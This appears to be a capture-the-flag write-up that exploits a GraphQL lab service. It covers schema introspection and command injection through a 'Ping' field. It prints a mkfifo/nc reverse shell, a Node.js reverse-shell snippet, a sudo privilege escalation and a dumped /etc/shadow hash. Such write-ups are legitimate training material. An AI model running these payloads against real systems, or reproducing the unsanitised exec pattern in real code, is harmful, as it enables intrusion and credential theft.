> GraphQL

GraphQL is a way to interact with APIs. It is not a database, nor a database language, it is simply a way to interact with APIs.  For example let's say you were trying to figure out the nutritional information of a box of cereal given that cereal's name.

In a normal REST api, you might do something like this

```bash
curl cereal.api -d "title='Lucky Charms'"
```

and you would receive a JSON response looking like

```js
{
"sugar": "50000000g"
"protein": "0g"
...
}
```

In GraphQL, your query would look like this

```js
{
Cereal(name: "Lucky Charms")
  {
   sugar
   protein
  }
 
}
```

# Task - Get hash of user Para using GraphIQL interface

Let's extract some sensitive information from `__schema`.

```js
{__schema{types{name description}}}`
```

```json
        {
          "name": "Ping",
          "description": null
        },
```

We got something interesting. Let's get the name of every field for the type Ping.

```js
{ __type(name: "Ping"){ fields { name } } }`
```

```json
{
  "data": {
    "__type": {
      "fields": [
        {
          "name": "ip"
        },
        {
          "name": "output"
        }
      ]
    }
  }
}
```

```js
{ Ping(ip: "10.8.107.21") { ip output } } 
```

And we can ping ourselves let's try for RCE.

```js
{ Ping(ip: "; ls") { ip output } } 
```

And we got it!

```json
{
  "data": {
    "Ping": {
      "ip": "; ls",
      "output": "node_modules\npackage-lock.json\nserver.js\n"
    }
  }
}
```

So let's try to get a shell!

```js
{ Ping(ip: "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.107.21 9001 >/tmp/f") { ip output } } 
```

And here is the code for ping query in `server.js`

```js
var schema = buildSchema(`
    type Query {
        Ping(ip: String!): Ping
        
    },
    type Ping {
        ip: String
        output: String
    }
`);
var pingIP = function(args) { 
    arr = {"ip": args.ip}
    arr.output = exec.execSync("ping -c 3 " + args.ip).toString()
    return arr;
}

var root = {
    Ping: pingIP,
    
};
```

```bash
sudo -l
Matching Defaults entries for para on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User para may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /usr/bin/node /home/para/server.js
```

Let's drop a NodeJS reverse shell in server.js. 

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.8.107.21", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

```bash
sudo /usr/bin/node /home/para/server.js
```

And we got a shell as root!🔥 

# Hash of para - /etc/shadow

```bash
para:$1$CHyLRSmg$QAvdWTC70dsIHuM5KmTf20:18535:0:99999:7:::
```